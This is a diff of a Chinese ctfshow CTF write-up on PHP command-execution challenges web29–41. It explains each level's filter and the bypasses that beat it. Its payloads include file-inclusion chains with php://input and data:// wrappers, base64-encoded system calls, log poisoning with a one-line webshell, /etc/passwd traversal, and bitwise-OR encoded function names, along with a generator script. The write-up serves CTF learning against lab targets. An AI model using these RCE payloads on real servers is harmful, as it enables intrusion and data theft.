@@ -3,7 +3,7 @@ title: "ctfshow-WEB入门（命令执行）"
 description: "ctfshow-WEB入门（命令执行）"
 image: "/assets/西施2.jpg"
 date: 2026-11-05
-updated: 2026-11-05
+updated: 2026-11-06
 categories:
   - 学习
 tags:
@@ -108,7 +108,7 @@ eval($c);
 
 `$c` 是我们传的 → 我们能让服务器执行**任意 PHP 代码**，这叫**任意代码执行（RCE 的一种）**。
 
-**两条铁律（新手必踩的坑）**：
+**两条铁律**：
 
 1. eval 里的字符串必须是**完整的 PHP 语句，结尾必须有分号 `;`**——少了分号会报错，而报错又被 `error_reporting(0)` 藏了 → 表现为白屏。
 2. 它执行的是 **PHP 代码**，不是直接执行 Linux 命令。想跑系统命令，要在里面调 `system("Linux命令")`。
@@ -187,6 +187,8 @@ eval($c);
 ?c=system("tac fla*");     ← 直接显示
 ?c=system("cat fla*.php | tac");   ← cat 输出再倒序，效果同 tac
 ```
+
+> 注意：`cat fla*.php` 里带 `.php`，这条**只适用于 web29**；从 web30 开始 `php` 也会被挡，要改用 `fla*`、`f*` 这类通配符。
 
 ![image-20261105101503448](/assets/ctfshow-web-command-exec/image-20261105101503448.png)
 
@@ -311,10 +313,10 @@ c 的值是 `eval($_GET[1]);`——里面没有 flag；命令藏在**第二个�
 
 - `include` 是语言构造不是函数，可以不写括号
 - `php://filter/read=convert.base64-encode/resource=flag.php` = 把 flag.php 的**源码** base64 编码后输出（避免 `<?php` 被浏览器吃掉的问题）
-- 出来一串 base64，拿 CyberChef（`Toolkit\Web\CyberChef`）解码就得到 flag
+- 出来一串 base64，解码就得到 flag
 - `?>` 是提前结束 PHP 语句的写法（include 那句后面不用分号）
 
-**Q1： `include$_GET[1]?>` 里的 `?>` 是什么？为什么不用分号？**
+##### Q1：`include$_GET[1]?>` 里的 `?>` 是什么？为什么不用分号？
 
 > **`?>` 是 PHP 的结束标记（closing tag）。**
 >
@@ -347,7 +349,7 @@ c 的值是 `eval($_GET[1]);`——里面没有 flag；命令藏在**第二个�
 > include $_GET[1]?>   // ?> 收尾，不用分号
 > ```
 
-**Q2：为什么用 `?>` 而不用 `;`？**
+##### Q2：为什么用 `?>` 而不用 `;`？
 
 > 这条 payload 塞在 URL 查询字符串里，而 PHP 的 `arg_separator.input` 默认把 `;` 也当作参数==分隔符==（作用等同 `&`）。写 `?c=include$_GET[1];&1=...` 时那个 `;` 可能把参数截断。用 `?>` 绕开这个坑，顺便替了分号的作用。
 >
@@ -362,6 +364,8 @@ c 的值是 `eval($_GET[1]);`——里面没有 flag；命令藏在**第二个�
 ![image-20261105115333631](/assets/ctfshow-web-command-exec/image-20261105115333631.png)
 
 `dGFjIGZsYSo=` 解码就是 `tac fla*`。检查时 c 里只有一串看不懂的 base64，运行时才解码——和法1同理：**让敏感词在“检查的时候”不存在**。
+
+里面的base64编码也可以使用`tac flag`的base64编码`dGFjIGZsYWc=`
 
 #### 法6：PHP 函数流，不使用linux命令
 
@@ -433,7 +437,7 @@ https://....challenge.ctf.show/shell.php
 
 | 选项              | 填什么                                                       |
 | :---------------- | :----------------------------------------------------------- |
-| **URL 地址**      | `http://70a5c459-...challenge.ctf.show/shell.php`（==去掉https的s==） |
+| **URL 地址**      | `http://<你的靶场地址>/shell.php`（==去掉https的s==） |
 | **连接密码**      | `1`                                                          |
 | 编码器 / 编码设置 | 默认（default）                                              |
 | 类型              | PHP（一般会自动识别）                                        |
@@ -812,3 +816,882 @@ PHP 双引号字符串支持 `\xHH` 转义：
 ```
 
 `ls -1 | head -n 1` 动态拿到第一个文件名，再交给 tac。好处是**完全不用写文件名**。但注意：必须有反引号（让整串作为命令执行）。
+
+### web32~35可以共用同一条 payload秒了
+
+```
+?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
+```
+
+下面web32~35是其他一些内容，如果只是刷题就可以不用看了
+
+### web32
+
+![image-20261106163659711](/assets/ctfshow-web-command-exec/image-20261106163659711.png)
+
+**提交的 c 参数里，一共禁止 13 样东西**
+
+- 禁词（7个单词，大小写都拦，因为有 /i）：
+	- flag，system，php，cat，sort，shell，echo
+
+- **禁符号（6个）：**
+	- `.`（点）：`\.` 是转义后的字面点
+	- 空格
+	- 单引号 `'`：`\'`
+	- 反引号`
+	- 分号 `;`
+	- 左括号 `(`
+
+#### 四个关键封杀点
+
+| 被封   | 为什么致命                                                   |
+| :----- | :----------------------------------------------------------- |
+| `(`    | **所有函数调用都没了**——`passthru(...)`、`system(...)`、`show_source(...)`、`scandir(...)`、连 `eval(...)` 本身都调不了 |
+| 反引号 | 反引号命令执行没了                                           |
+| `;`    | 语句不能用分号结束                                           |
+| `echo` | 不能回显输出                                                 |
+
+**web31 那套「函数 + 通配符 + 反引号」的打法，在这里全部报废**。因为 PHP 里调用函数必须写括号，没括号就调不了。
+
+#### 重复的方法：
+
+思路在重复(但实现方式要升级了)
+
+| 老思路                                           | 在 web32 的形态                           | 说明                                                |
+| :----------------------------------------------- | :---------------------------------------- | :-------------------------------------------------- |
+| **参数转移**(c 里放干净的东西，命令丢第二个参数) | `?c=include$_GET[1]?>&1=...`              | 一模一样的思想，web29/30/31 都在用                  |
+| **php://filter + base64 读源码**                 | 放进参数 `1` 而不是 `c`                   | web29 用过伪协议，这次因为 c 里不能有 php，必须转移 |
+| **日志注入 + 蚁剑**                              | `&1=../../../../var/log/nginx/access.log` | 换个入口                                            |
+| 相对路径穿越                                     | `../../../../etc/passwd`                  | 文件包含通用技巧                                    |
+
+我们这时候就需要**语言构造**了
+
+#### 语言构造
+
+PHP 里有一类东西**不是函数**，所以**不需要括号**：
+
+```
+include "文件";        // 语言构造
+include_once "文件";
+require "文件";        // 出错会终止
+require_once "文件";
+print 123;             // 也是语言构造
+die;                   // 直接退出
+```
+
+`include` 是本题的入口——它会把指定文件**当成 PHP 代码加载执行**（不只是读内容，后面可以使用这个一把梭）。
+
+#### 原理
+
+##### 1.为什么 `include$_GET[1]` 不用括号？
+
+因为 `include` 是**语言构造(language construct)**，不是函数。PHP 解析器把它当关键字处理，后面直接跟表达式即可：
+
+```
+include $_GET[1];     // 正常写法(空格被过滤，但…)
+include$_GET[1];      // 紧挨着也能解析
+```
+
+而 `passthru` 是**函数**，必须 `passthru(...)`，括号一封就死。
+
+> 语言构造还有：`echo`、`print`、`die`/`exit`、`isset`、`empty`、`unset`、`list`、`array`、`include`/`require` 系列。注意 `isset()`/`empty()` 还是要括号的语法形式。
+
+##### 2.为什么 `?>` 能代替分号？
+
+PHP 有个语法规则：**`?>` 关闭标签时，PHP 会自动把它当成分号的结束**。所以：
+
+```
+include $_GET[1]?>     // 合法！?> 自带"语句结束"效果
+```
+
+分号被封，`?>` 就成了语句结束符。这也是为什么所有 payload 都以 `?>` 收尾。
+
+##### 3.为什么 `%0a` 能用？
+
+`%0a` 是**换行符(Line Feed)**，PHP 把它当普通空白字符。过滤只挡了字面空格` `，换行/制表符都没挡。所以 `include%0a$_GET[1]` 就是 `include\n$_GET[1]`，合法。
+
+#### 四条解法
+
+##### 法 1：php://filter + base64(最经典)
+
+```
+?c=include$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
+```
+
+拆解：
+
+- `c=include$_GET[1]?>` → 包含"参数 1 指定的资源"
+- `&1=php://filter/convert.base64-encode/resource=flag.php` → 参数 1 是 php 伪协议：**读 flag.php 的源码并 base64 编码输出**
+- 结果是一大串 base64，拿去 CyberChef(或 Git Bash `base64 -d`)解码
+
+要 flag 完整内容：`... | base64 -d | grep -o "ctfshow{[^}]*}"`
+
+##### 法 2：php://input + POST(最好玩，直接变成 RCE)
+
+```
+URL:  ?c=include$_GET[1]?>&1=php://input
+POST body: <?php system("tac flag.php")?>
+```
+
+原理：`php://input` 代表"请求体"。include 它 = 把请求体当成 PHP 代码**执行**。请求体里的 `system(...)`、`;` 都不受过滤影响（过滤只查 `c` 参数）。
+
+> 这就是**文件包含 → 远程代码执行**的标准链条：`include` 不只读文件，它**执行**文件里的 PHP 代码。
+
+##### 法 3：data:// 伪协议(最短)
+
+```
+?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
+```
+
+把 PHP 代码直接放在 URL 里当"文件"包含。前提是 `allow_url_include=On`。不用 POST，一条 GET 就出 flag。
+
+###### Q1:什么是`allow_url_include=On`?
+
+> `allow_url_include` 是 PHP 配置文件（php.ini）里的一个开关：
+>
+> - **allow**：允许
+> - **url**：网址、远程链接
+> - **include**：包含（就是前面讲的 include 那个文件包含语句）
+> - **=On**：开启
+>
+> 合起来意思是：**“允许 include 去包含 URL 形式（远程 / 伪协议）的资源”**。
+
+###### Q2：这个开关管什么？
+
+> PHP 的 include 有两种用法，受这个开关控制：
+>
+> 1. **包含本地文件**（比如 `include 'flag.php'`）
+> 	不管开关是开是关，都能用
+> 2. **包含 URL 形式的资源**，比如：
+> 	- `data://text/plain,代码`
+> 	- `http://别的网站/shell.txt`
+> 	- `php://input`
+> 		只有 **allow_url_include = On** 时，include 才肯加载这些；如果是 **Off（默认值，PHP 5.2 之后默认关闭）**，include 直接报错拒绝，payload 就失败
+
+###### 为什么这条 data://payload要用？
+
+> ```
+> ?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
+> ```
+>
+> `data://` 的意思是：**“文件内容直接写在 URL 里”**，服务器上根本不存在这个文件，include 要把 data:// 后面的文字当成一个 “远程文件” 读进来并执行里面的 PHP 代码。这在 PHP 看来属于 “包含 URL”，所以必须开这个开关。
+
+###### 区分：
+
+> - `data://`、`http://`、`php://input` → **需要** allow_url_include=On
+> - `php://filter`（之前那个 base64 读源码的伪协议）→ **不需要**，它属于本地文件操作类包装器，开关关着也能用
+
+###### 怎么确认目标开没开？
+
+> - 看目标的 `phpinfo()` 页面，搜索 allow_url_include，会显示 On 或 Off
+> - 这个配置是服务器管理员设的，攻击者一般改不了，所以教程说它是 “前提”
+
+##### 法 4：日志注入(不知道 flag 文件名时用)
+
+```
+?c=include$_GET[1]?>&1=../../../../var/log/nginx/access.log
+```
+
+- nginx 会把每个请求的 **User-Agent 写进 access.log**
+- 先把 UA 改成一个一句话木马：`<?php eval($_POST[1]);?>`（用 Burp 改包或浏览器插件）
+- 再 include 这个日志文件 → 日志里的木马被执行
+- 然后用蚁剑连（或者直接再 POST 命令）
+
+**这是不知道 flag 在哪时的通用打法**：只要能读日志，就能养马。
+
+### web33
+
+![image-20261106194230887](/assets/ctfshow-web-command-exec/image-20261106194230887.png)
+
+和 web32 的就一个字符差别
+
+新增过滤：**双引号 `"`**
+
+```
+"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i"
+```
+
+#### 重复的方法
+
+| 方法                         | 在 web33的写法                                               |
+| :--------------------------- | :----------------------------------------------------------- |
+| `include` + 参数转移         | `?c=include$_GET[1]?>&1=...`                                 |
+| php://filter + base64 读源码 | `&1=php://filter/read=convert.base64-encode/resource=flag.php` |
+| php://input + POST 执行代码  | `&1=php://input` + body `<?php system("tac flag.php")?>`     |
+| data:// 伪协议               | `&1=data://text/plain,<?php system("tac flag.php")?>`        |
+| 相对路径穿越                 | `&1=../../../../etc/passwd`                                  |
+| 日志注入 + 蚁剑              | 同上，`&1=.../access.log`                                    |
+
+#### 推荐的payload
+
+##### 1.读源码 base64
+
+```
+?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+拿到 base64 后：Git Bash 里 `base64 -d`,或 CyberChef 解码。
+
+##### 2.一次性拿flag
+
+```
+URL: ?c=include$_GET[1]?>&1=php://input
+POST body: <?php system("tac flag.php")?>
+```
+
+##### 3.使用 **GET** 
+
+```
+?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
+```
+
+这个依赖 `allow_url_include=On`，这个开着才能使用
+
+### web34
+
+**和 web33 相比，只多过滤了一个冒号 `:`**
+
+```
+"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"/i"
+```
+
+- `\:` 是字面冒号（冒号在正则里本身不是特殊字符，这里的反斜杠只是写法统一）
+- 冒号是 `php://`、`data://`、`http://` 这些伪协议的"协议分隔符"
+
+#### Q1：封冒号说明了什么？
+
+> 封了冒号，等于说：**c 参数里不能直接写伪协议**。如果前面几题是把 `php://filter...` 直接塞进 `c` 的，这里就会失效；但前面讲的"参数转移"，把协议放进第二个参数还是能够使用的。
+
+#### 重复的方法
+
+| 方法 | 在 web34 的写法 | 说明 |
+| :--- | :--- | :--- |
+| 参数转移 | `?c=include$_GET[1]?>&1=...` | c 里没有冒号，天然安全 |
+| php://filter + base64 | `&1=php://filter/read=convert.base64-encode/resource=flag.php` | 冒号在参数 1 里 |
+| data:// | `&1=data://text/plain,<?php system("tac flag.php")?>` | 同上 |
+| php://input | `&1=php://input`，POST body 执行代码 | 同上 |
+| 相对路径穿越 | `&1=../../../../etc/passwd` | 同上 |
+| 日志注入 + 蚁剑 | `&1=../../../../var/log/nginx/access.log` | 同上 |
+
+**结论：web34 没有新方法，web32/33 的 payload 原样可用。**
+
+#### 唯一失效的写法
+
+把协议直接写在 c 里：
+
+```
+?c=include:$_GET[1]?>    ← c 里出现冒号 → 空回显
+```
+
+#### 推荐 payload
+
+```
+?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+### web35
+
+**新增过滤：`<` 和 `=`**
+
+```
+"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=/i"
+```
+
+- `\<` 小于号：`c` 里不能再写 `<?php`、`<?=` 这类 PHP 开标签
+- `\=` 等号：`c` 里不能再写赋值 `$a=$b`
+
+#### 重复的方法
+
+| 方法 | 在 web35 的写法 | 说明 |
+| :--- | :--- | :--- |
+| 参数转移 | `?c=include$_GET[1]?>&1=...` | c 里没有 `<`、`=` |
+| php://filter + base64 | `&1=php://filter/read=convert.base64-encode/resource=flag.php` | 协议和路径都在参数 1 |
+| data:// 明文 | `&1=data://text/plain,<?php system("tac flag.php")?>` | `<?php` 在参数 1，不受过滤 |
+| php://input | `&1=php://input`，POST body 执行代码 | `<`、`=` 都在 body 里 |
+| 相对路径穿越 | `&1=../../../../etc/passwd` | — |
+| 日志注入 + 蚁剑 | `&1=../../../../var/log/nginx/access.log` | — |
+
+#### 新方法：data:// 的 base64 形式
+
+```
+?c=include$_GET[1]?>&1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+
+```
+
+- `;base64,` 表示后面的内容先 base64 解码，再当作文件内容
+- `PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+` 解码 = `<?php system("tac flag.php")?>`
+- 好处：URL 里完全不出现 `<`、`=`、空格、引号这些敏感字符
+- 自己生成：`printf '%s' '<?php system("tac flag.php")?>' | base64 -w0`
+
+#### 推荐 payload
+
+```
+?c=include$_GET[1]?>&1=data://text/plain,<?php system("tac flag.php")?>
+?c=include$_GET[1]?>&1=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+
+?c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+### web36
+
+**新增过滤：`/` 和 `[0-9]`**
+
+```
+"/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\:|\"|\<|\=|\/|[0-9]/i"
+```
+
+- `\/`：斜杠（路径分隔符）
+- `[0-9]`：**所有数字**
+
+参数名不能使用数字了
+
+前面几题的骨架都是 `include$_GET[1]?>`，这里的 `1` 是数字，会被 `[0-9]` 拦下，整个 payload 失效。
+
+那就**把参数名换成字母**呗。
+
+```
+?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
+```
+
+- `$_GET[a]` 里的 `a` 不加引号，PHP 会当字符串 `"a"` 处理
+- c 里一个没有数字，顺利通过过滤
+
+#### Q1：斜杠被封为什么没影响？
+
+> 因为路径（`php://filter/.../resource=flag.php`）全部放在**参数 a** 里，而**过滤只检查 c**。
+
+#### 重复的方法（改个参数名即可）
+
+| 方法 | 在 web36 的写法 |
+| :--- | :--- |
+| 参数转移 | `?c=include$_GET[a]?>&a=...` |
+| php://filter + base64 | `&a=php://filter/read=convert.base64-encode/resource=flag.php` |
+| data:// | `&a=data://text/plain,<?php system("tac flag.php")?>` |
+| data:// base64 | `&a=data://text/plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKT8+` |
+
+### web37
+
+**这题代码结构变了**
+
+```php
+error_reporting(0);
+if(isset($_GET['c'])){
+    $c = $_GET['c'];
+    if(!preg_match("/flag/i", $c)){
+        include($c);
+        echo $flag;
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+- 过滤只剩 `/flag/i`（比前面松多了）
+- 但多了 `echo $flag;`
+- 注释写明：`//flag in flag.php`
+
+#### 法 1：data:// 直接执行命令
+
+```
+?c=data://text/plain,<?php system('tac fl*');?>
+```
+
+- web37 只挡 flag，**单引号没有被挡**
+- `fl*` 用通配符绕开 flag
+
+#### 法 2：php://input（要 POST）
+
+```
+URL: ?c=php://input
+POST body: <?php system('tac fl*');?>
+```
+
+#### 法 3：data:// + base64
+
+```
+?c=data://text/plain;base64,PD9waHAgaW5jbHVkZSgnZmxhZy5waHAnKTtlY2hvICRmbGFnOz8+
+```
+
+这串 base64 解码是：
+
+```php
+<?php include('flag.php');echo $flag;?>
+```
+
+为什么能过过滤：提交的 `c` 里只有 `PD9waHAg...` 这些 base64 字符，**"flag" 三个字母是编码后的**，过滤器看不见；等 data 协议解码执行时才还原，正好走完 `include` + `echo $flag` 的流程。
+
+### web38
+
+**这题封了 `php` 和 `file`**
+
+```php
+if(!preg_match("/flag|php|file/i", $c)){
+    include($c);
+    echo $flag;
+}
+```
+
+- 过滤：`flag`、`php`、`file` 三个词
+- 代码还是 `include($c); echo $flag;`
+
+#### PS：这题有点狠
+
+- `php` 被封 → **`<?php` 开标签写不了**，**`php://` 伪协议也用不了**
+- `file` 被封 → 额外堵掉了 `file://`；`php://filter` 失效是因为它含 `php`，`filter` 里并没有 `file`
+- 前面的 `php://filter`、`php://input`、`<?php`，到这里都用不了
+
+#### 新方法 1：使用`<?=` 短标签
+
+`<?=` 是 PHP 的「短 echo 标签」，等价于 `<?php echo`，但它**不含 "php" 这三个字母**：
+
+```
+?c=data://text/plain,<?=system('tac fl*')?>
+```
+
+- `<?=` 从 PHP 5.4 起恒可用，不受 `short_open_tag` 配置影响
+- `system` 这题没被封（只封了 flag/php/file）
+- `fl*` 继续用通配符绕 flag
+
+#### 新方法 2：base64 把关键字全藏起来
+
+```
+?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwqJyk7Pz4=
+```
+
+- 解码 = `<?php system('tac fl*');?>`
+- 提交的 c 里只有 base64 字符，`php`、`flag` 都在编码之后，过滤器看不见
+- 生成：`printf '%s' "<?php system('tac fl*');?>" | base64 -w0`
+
+### web39
+
+**偷偷加了个 `.php`**
+
+```php
+if(!preg_match("/flag/i", $c)){
+    include($c.".php");
+}
+```
+
+- 过滤只有 `flag`
+- 但代码是 `include($c.".php")`：你传什么，后面都会**自动补 `.php`**
+
+#### 使用的payload
+
+```
+?c=data://text/plain,<?php system('tac fl*')?>
+```
+
+实际执行：
+
+```php
+include("data://text/plain,<?php system('tac fl*')?>.php");
+```
+
+data 协议的内容 = `<?php system('tac fl*')?>` + `.php`。多出来的 `.php` **落在 `?>` 之后**，是 PHP 标签外的普通文字，只会被原样输出。
+
+#### Q1：为什么不能使用base64 和 php://input ？
+
+> | payload                                 | 实际变成          | 结果                                    |
+> | :-------------------------------------- | :---------------- | :-------------------------------------- |
+> | `data://text/plain;base64,PD9wa...Pz4=` | `...Pz4=.php`     | 失败：`.php` 塞进 base64 串，解码被破坏 |
+> | `php://input`                           | `php://input.php` | 失败：包装器路径非法                    |
+> | `data://text/plain,<?php ...?>`         | `...?>.php`       | 成功：后缀是标签外文字，无害            |
+
+**需要判断的地方**：看到"自动补后缀"的代码，要想一下补上的后缀会不会破坏payload
+
+### web40
+
+![image-20261106210423382](/assets/ctfshow-web-command-exec/image-20261106210423382.png)
+
+**过滤里藏了个坑：括号是全角的**
+
+```php
+if(!preg_match("/[0-9]|\~|\`|\@|\#|\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\/i", $c)){
+    eval($c);
+}
+```
+
+被封的东西：
+
+- 所有数字
+- `~` `` ` `` `@` `#` `$` `%` `^` `&` `*`
+- `-` `=` `+` `{` `[` `]` `}` `:` `'` `"` `,` `<` `.` `>` `/` `?` `\`
+- **注意：写的是全角 `（` `）`，半角 `( )` 没有被封**
+
+因为数字、`$`、`[`、`]` 都被封了，**不能用变量、不能用参数**，这就是“无参数”的由来。但半角括号、分号 `;`、下划线 `_` 还在，所以函数还能调用，只是不能传变量。
+
+#### Q1：什么是全角，什么是半角？
+
+> **全角和半角是两套“长得像、但编码完全不同”的字符，区别主要在宽度。**
+>
+> - **半角（half-width）**：窄，占一个字符宽度，比如 `( )`
+> - **全角（full-width）**：宽，占两个字符宽度（和一个汉字一样宽），比如 `（ ）`
+
+#### Q2：为什么会有这两种？
+
+> - 最早的电脑只处理英文，一个字母 / 符号占一个格子，这就是半角，比如 `( ) , ; : ?`
+> - 后来要处理中文、日文这些“方块字”，一个汉字宽度正好等于两个英文字母，于是就有了全角字符；连标点也做了一套全角版本，和汉字排版对齐
+> - 它们虽然看起来像，但在计算机里是**完全不同的字符、不同的编码**，程序不会把它们当成同一个东西
+>
+> **给你对照着看看**
+>
+> | 半角    | 全角      |
+> | :------ | :-------- |
+> | `(` `)` | `（` `）` |
+> | `;`     | `；`      |
+> | `,`     | `，`      |
+> | `:`     | `：`      |
+> | `?`     | `？`      |
+> | `ABC`   | `ＡＢＣ`  |
+>
+> **全角更胖、和汉字一样宽；半角更窄、只有一半宽。**
+
+**回到这题看**
+
+过滤正则里写的是全角 `（` `）`，意思是它只拦全角括号；而写 PHP 代码、调用函数真正需要的是**半角 `( )`**，正则里根本没写这个字符，所以半角括号没被封，照样能用。作者用了一个“看起来一样、实际不同”的字符来做过滤。
+
+#### Q3：怎么打出来？
+
+> - 中文输入法处于“中文标点”状态时，按括号键出来的就是全角 `（ ）`
+> - 切成英文标点（或直接用英文输入法），出来的就是半角 `( )`
+> - 很多输入法里 `Shift + 空格` 可以切换全角 / 半角模式
+>
+> **写代码时要注意的地方：**
+>
+> PHP、命令行里的代码符号必须用半角：`( ) ; ' "` 这些。全角符号在代码里只会被当成普通文字，直接语法报错。全角标点只会用在中文文章里。
+
+#### 解法：使用无参数函数链
+
+先侦察：
+
+```
+?c=print_r(scandir(getcwd()));
+```
+
+输出：
+
+![image-20261106205347458](/assets/ctfshow-web-command-exec/image-20261106205347458.png)
+
+```
+Array
+(
+    [0] => .
+    [1] => ..
+    [2] => flag.php
+    [3] => index.php
+)
+```
+
+读文件：
+
+```
+?c=show_source(next(array_reverse(scandir(getcwd()))));
+```
+
+从里往外看：
+
+| 步骤 | 结果 |
+| :--- | :--- |
+| `scandir(getcwd())` | `['.', '..', 'flag.php', 'index.php']` |
+| `array_reverse(...)` | `['index.php', 'flag.php', '..', '.']` |
+| `next(...)` | 指针从第 1 个后移到第 2 个 → `flag.php` |
+| `show_source(...)` | 输出它的源码 |
+
+没有变量、没有数字、没有引号，都是些不带参数的函数。
+
+![image-20261106205434915](/assets/ctfshow-web-command-exec/image-20261106205434915.png)
+
+#### 其他等价写法
+
+```
+?c=highlight_file(next(array_reverse(scandir(getcwd()))));
+?c=readfile(next(array_reverse(scandir(getcwd()))));
+?c=show_source(array_rand(array_flip(scandir(getcwd()))));
+```
+
+最后一条的命令是随机挑一个文件，多刷新几次也能出 flag。
+
+**注意：**
+
+`phpinfo()` 这题**没有被挡**（“php” 不在名单里），可以用来看环境。它输出的是 `<!DOCTYPE html ...>` 开头的 HTML。
+
+### web41
+
+![image-20261106210405923](/assets/ctfshow-web-command-exec/image-20261106210405923.png)
+
+**字母数字全封，而且是 POST**
+
+```php
+if(isset($_POST['c'])){
+    $c = $_POST['c'];
+    if(!preg_match('/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&|\-/i', $c)){
+        eval("echo($c);");
+    }
+}
+```
+
+- **这题用 POST**（前面都是 GET），参数名仍是 `c`
+- 封了：数字、字母（不区分大小写）、`^` `+` `~` `$` `[` `]` `{` `}` `&` `-`
+- 还能用：`( ) ; ' " | . , < > / ? : % * = _` 和空白
+
+前面常用的 `~` 取反法在这里被封了，只能换**位或 `|`**。
+
+#### 原理：用两个字节“或”出字符
+
+PHP 支持两个字符串按位或：
+
+```php
+'%13' | '%60'   →   0x13 | 0x60 = 0x73 = 's'
+```
+
+比较关键的地方：POST body 里的 `%13` 被服务器 URL 解码成**原始字节 0x13**，它不是数字也不是字母，**能过过滤**；`|` 本身也没被封。用 `.` 把字符拼起来，就能拼出函数名和参数。
+
+PHP 7 以上支持“字符串直接当函数调用”，所以用：
+
+```php
+(函数名字符串)(参数字符串)
+```
+
+就能执行命令。
+
+#### payload
+
+先看目录（相当于 `system("ls")`）：
+
+```
+c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))
+```
+
+读 flag（相当于 `system("cat fl*")`）：
+
+```
+c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%03'|'%60').('%01'|'%60').('%14'|'%60').(' '|' ').('%06'|'%60').('%0c'|'%60').('%0a'|' '))
+```
+
+#### 字符对照
+
+> | 字符 | 十六进制 | 构造           |
+> | :--- | :------- | :------------- |
+> | s    | 0x73     | `0x13 \| 0x60` |
+> | y    | 0x79     | `0x19 \| 0x60` |
+> | t    | 0x74     | `0x14 \| 0x60` |
+> | e    | 0x65     | `0x05 \| 0x60` |
+> | m    | 0x6d     | `0x0d \| 0x60` |
+> | l    | 0x6c     | `0x0c \| 0x60` |
+> | c    | 0x63     | `0x03 \| 0x60` |
+> | a    | 0x61     | `0x01 \| 0x60` |
+> | f    | 0x66     | `0x06 \| 0x60` |
+> | 空格 | 0x20     | `' '\|' '`     |
+> | `*`  | 0x2a     | `0x0a \| 0x20` |
+
+#### 或者你想自己生成？
+
+```python
+blocked = set("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ^+~$[]{}&-")
+
+def fmt(x):
+    c = chr(x)
+    if 32 <= x < 127 and c not in blocked and c not in "'\%":
+        return c
+    return "%%%02x" % x
+
+def enc(s):
+    parts = []
+    for ch in s:
+        t = ord(ch)
+        for a in range(1, 127):
+            for b in range(1, 127):
+                if a | b == t:
+                    parts.append("('%s'|'%s')" % (fmt(a), fmt(b)))
+                    break
+            else:
+                continue
+            break
+        else:
+            raise ValueError(ch)
+    return ".".join(parts)
+
+print("c=(%s)(%s)" % (enc("system"), enc("cat fl*")))
+```
+
+（脚本可能把可打印字节直接写出来，效果和 `%XX` 写法一样。）
+
+#### 法1：用Burp
+
+##### 第 0 步：先看清抓到的原始请求（它是 GET）
+
+浏览器打开靶机后，Burp 里抓到的是这样一条**纯 GET** 请求：
+
+![image-20261106213552609](/assets/ctfshow-web-command-exec/image-20261106213552609.png)
+
+注意：这条请求里**没有 `Content-Length`**，也没有请求体——GET 本来就不带 body，服务器的参数是从 URL 的 `?c=...` 里读的。而 web41 要的是 `$_POST['c']`，所以要进行修改。
+
+##### 第 1 步：把请求送到 Repeater
+
+1.空白处**右键** → **Send to Repeater（发送到重放器）**
+
+2.点顶部的 **Repeater（重放器）** 标签
+
+![image-20261106213709226](/assets/ctfshow-web-command-exec/image-20261106213709226.png)
+
+```
+GET / HTTP/1.1
+Host: 176d10f4-5a4e-48eb-90fd-62a5293581a9.challenge.ctf.show
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://ctf.show/
+Upgrade-Insecure-Requests: 1
+Sec-Fetch-Dest: document
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Site: same-site
+Sec-Fetch-User: ?1
+Sec-Gpc: 1
+Priority: u=0, i
+Te: trailers
+Connection: close
+
+
+```
+
+##### 第 2 步：要改的3 个地方
+
+| 改哪里 | 原来的样子 | 改成 |
+| :--- | :--- | :--- |
+| **请求行** | `GET / HTTP/1.1` | `POST / HTTP/1.1` |
+| **请求头** | 没有 `Content-Length` | 加一行 `Content-Length: 116`（数字是 body 的字节数） |
+| **空行 + body** | 头结束就没了 | 头后面**空一行**，再写 `c=...` |
+
+##### Q1：为什么要加 `Content-Length`？
+
+> HTTP 里 POST 如果没有 `Content-Length`（也没有 `Transfer-Encoding`），服务器会认为“这个请求没有请求体”，写在下面的 `c=...` 会被直接忽略。PHP 里 `$_POST['c']` 就是空的，`isset($_POST['c'])` 为假，于是走了 `else` 分支——页面回显的是题目源码（`highlight_file`），看起来就像“没反应”。
+
+##### Q2：为什么必须有空行？
+
+> 请求头和请求体之间要用一个空行分隔。没有空行时，`c=...` 会被当成一个请求头，而不是 body。
+
+##### 第 3 步：改完后的完整请求（读目录）
+
+先看目录（相当于 `system("ls")`，参数c是：
+
+```
+c=(('%13'|'%60').('%19'|'%60').('%13'|'%60').('%14'|'%60').('%05'|'%60').('%0d'|'%60'))(('%0c'|'%60').('%13'|'%60'))
+```
+
